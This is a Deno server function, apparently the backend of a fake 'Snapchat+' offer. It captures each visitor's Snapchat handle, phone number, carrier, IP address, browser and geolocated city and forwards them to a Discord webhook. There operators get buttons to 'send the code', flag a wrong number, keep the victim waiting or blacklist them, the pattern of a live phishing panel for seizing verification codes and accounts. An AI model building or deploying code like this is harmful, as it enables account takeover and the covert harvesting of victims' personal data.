import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const DISCORD_WEBHOOK = Deno.env.get("DISCORD_WEBHOOK");

Deno.serve(async (req) => {
  const authHeader = req.headers.get("authorization") || "";
  const token = authHeader.replace("Bearer ", "");
  const expectedToken = Deno.env.get("WEBHOOK_SECRET");
  if (expectedToken && token !== expectedToken) {
    return Response.json({ error: "Unauthorized" }, { status: 401 });
  }

  const base44 = createClientFromRequest(req);
  const body = await req.json();
  const { snapchat, telephone, operateur, submissionId } = body;

  const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
  const formatPhoneRaw = (tel) => tel.replace(/\D/g, '').slice(-10);

  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";
  const userAgent = req.headers.get("user-agent") || "";
  
  let browser = "Inconnu";
  let device = "Inconnu";
  
  if (userAgent.includes("Chrome")) browser = "Chrome";
  else if (userAgent.includes("Safari")) browser = "Safari";
  else if (userAgent.includes("Firefox")) browser = "Firefox";
  else if (userAgent.includes("Edge")) browser = "Edge";
  
  if (userAgent.includes("Mobile") || userAgent.includes("Android")) device = "📱 Téléphone";
  else if (userAgent.includes("iPad")) device = "📱 Tablette";
  else device = "💻 PC";
  
  const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };

  const now = new Date();
  const dateStr = now.toLocaleDateString("fr-FR", {
    weekday: "long", day: "numeric", month: "long", year: "numeric",
    hour: "2-digit", minute: "2-digit", second: "2-digit",
    timeZone: "Europe/Paris"
  });

  const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
  const triggerUrl = `${appUrl}/?trigger=${submissionId}`;
  const wrongUrl = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
  const waitUrl = `${appUrl}/?triggerAction=wait&id=${submissionId}`;

  // Create a simple blacklist URL with base64 encoding
  const blacklistPayload = btoa(JSON.stringify({ ip, telephone, submissionId }));
  const blacklistUrl = `${appUrl}/api/blacklist?data=${blacklistPayload}`;

  let country = "France";
  let city = "Inconnue";
  
  if (ip && ip !== "Inconnue") {
    try {
      const geoResponse = await fetch("https://ipapi.co/" + ip + "/json/");
      if (geoResponse.ok) {
        const geoData = await geoResponse.json();
        country = geoData.country_name || "France";
        city = geoData.city || "Inconnue";
      }
    } catch (e) {
      // Fallback to defaults
    }
  }

  const embed = {
    title: "📱 Nouvelle soumission Snapchat+",
    color: operatorColors[operateur] || 16776960,
    fields: [
      { name: "👤 Utilisateur", value: `@${snapchat}`, inline: true },
      { name: "📡 Opérateur", value: operateur, inline: true },
      { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
      { name: "🌍 Pays", value: country, inline: true },
      { name: "🏙️ Ville", value: city, inline: true },
      { name: "🌐 Navigateur", value: browser, inline: true },
      { name: "💾 Appareil", value: device, inline: true },
      { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: false },
      { name: "🕐 Date de soumission", value: dateStr, inline: false },
      {
        name: "⚡ Actions",
        value: `✅ [**Envoyer le code**](${triggerUrl})\n❌ [**Mauvais numéro**](${wrongUrl})\n⏳ [**Faire patienter**](${waitUrl})\n🚫 [**Instant Blacklist**](${blacklistUrl})`,
        inline: false
      },
    ],
    footer: { text: `ID: ${submissionId || "N/A"}` },
    timestamp: now.toISOString(),
  };

  await fetch(DISCORD_WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: "@everyone", embeds: [embed] }),
  });

  await base44.asServiceRole.entities.ActionLog.create({
    submission_id: submissionId,
    action: "submitted",
    details: { browser, device, ip, country, city },
    timestamp: now.toISOString()
  });

  return Response.json({ ok: true });
});